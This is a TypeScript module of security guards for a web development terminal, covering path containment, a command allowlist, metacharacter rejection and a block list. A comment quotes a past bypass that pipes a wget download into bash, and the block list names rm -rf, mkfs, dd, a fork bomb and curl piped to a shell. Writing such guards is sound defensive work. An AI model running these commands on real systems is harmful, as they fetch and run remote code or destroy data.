/**
 * Guards for the development terminal (server/api/terminal/execute.post.ts).
 *
 * These live in their own module for one reason: the route file calls Nitro's
 * auto-imported defineEventHandler at module scope, so importing it from a test
 * throws before a single assertion runs. Pure logic that decides what may
 * execute has to be reachable by tests, or it is not really a guard.
 *
 * See __tests__/terminalGuards.test.ts — every case there is a bypass that
 * worked in production before 2026-08-23.
 */
import { resolve, relative, isAbsolute } from 'node:path'

/**
 * Resolve `p` and prove it stays inside `root`.
 *
 * The previous guard was `resolved.startsWith(root)`, which is a prefix test on
 * a string, not a containment test on a path: with root=/srv/app it accepts
 * /srv/app-secrets. relative() answers the actual question — a path inside root
 * never starts with '..' and is never absolute.
 */
export function resolveInside(root: string, p: string): string | null {
  const target = resolve(root, String(p || ''))
  const rel = relative(root, target)
  if (rel === '') return target
  if (rel.startsWith('..') || isAbsolute(rel)) return null
  return target
}

/**
 * Commands permitted in the serverless (production) runtime.
 *
 * Matched against the FIRST TOKEN ONLY, after the command has been proven free
 * of shell metacharacters. The old gate regex-matched the start of the raw
 * string, so `echo ok; wget -O- http://x | bash` passed it.
 *
 * `node -e`, `env` and `printenv` are deliberately NOT here. `node -e` is
 * arbitrary code execution, and the other two print SUPABASE_SERVICE_KEY and
 * ANTHROPIC_API_KEY to anyone who can reach this endpoint. Their presence is
 * what made the "production is read-only" promise false.
 */
export const SERVERLESS_ALLOWED_BINARIES = new Set([
  'echo', 'cat', 'head', 'tail', 'wc', 'sort', 'uniq', 'date',
  'ls', 'pwd', 'which', 'whoami', 'git',
])

/** git subcommands that only read. Anything else (config, push, checkout) is refused. */
export const SERVERLESS_ALLOWED_GIT = new Set([
  'log', 'status', 'diff', 'show', 'branch', 'rev-parse', 'remote',
])

/**
 * Anything that could start a second command, redirect, or expand.
 * Checked before the allowlist so the allowlist only ever sees one command.
 */
export const SHELL_METACHARACTERS = /[;&|`$(){}<>\n\r\\]|\|\||&&/

/**
 * Split a metacharacter-free command into argv, honouring simple quoting.
 * Only called after SHELL_METACHARACTERS has been rejected, so this does not
 * need to model expansion — just whitespace and quotes.
 */
export function tokenize(cmd: string): string[] {
  const out: string[] = []
  const re = /"([^"]*)"|'([^']*)'|(\S+)/g
  let m: RegExpExecArray | null
  while ((m = re.exec(cmd))) out.push(m[1] ?? m[2] ?? m[3])
  return out
}

/**
 * Decide whether `cmd` may run in the serverless runtime.
 * Returns null when allowed, or the reason to show the caller.
 */
export function serverlessRefusal(cmd: string): string | null {
  if (SHELL_METACHARACTERS.test(cmd)) {
    return '⚠ Command refused in production: shell metacharacters (; & | ` $ ( ) < > \\) are not permitted.\n' +
      'They allow a second command to run behind an allowed one. Run a single plain command, ' +
      'or use the read_file / search_code / list_directory tools.'
  }
  const argv = tokenize(cmd)
  const bin = argv[0]
  if (!bin) return 'Error: empty command'
  if (!SERVERLESS_ALLOWED_BINARIES.has(bin)) {
    return `⚠ '${bin}' is not available in production (Vercel serverless).\n` +
      `Allowed: ${[...SERVERLESS_ALLOWED_BINARIES].join(', ')} ` +
      `(git limited to ${[...SERVERLESS_ALLOWED_GIT].join('/')}).\n` +
      'For a full shell, run the terminal in development mode (npm run dev).\n' +
      'Tip: read_file, search_code and list_directory work in both environments.'
  }
  if (bin === 'git') {
    const sub = argv[1]
    if (!sub || !SERVERLESS_ALLOWED_GIT.has(sub)) {
      return `⚠ 'git ${sub ?? ''}' is not available in production. ` +
        `Read-only git subcommands only: ${[...SERVERLESS_ALLOWED_GIT].join(', ')}.`
    }
  }
  return null
}

// Safety: prevent obviously dangerous commands
export const BLOCKED_PATTERNS = [
  /\brm\s+-rf\s+[\/~]/i,
  /\bmkfs\b/i,
  /\bdd\s+if=/i,
  /\b:(){.*};:/,
  /\bshutdown\b/i,
  /\breboot\b/i,
  /\bcurl\b.*\|\s*(sh|bash)/i,
]
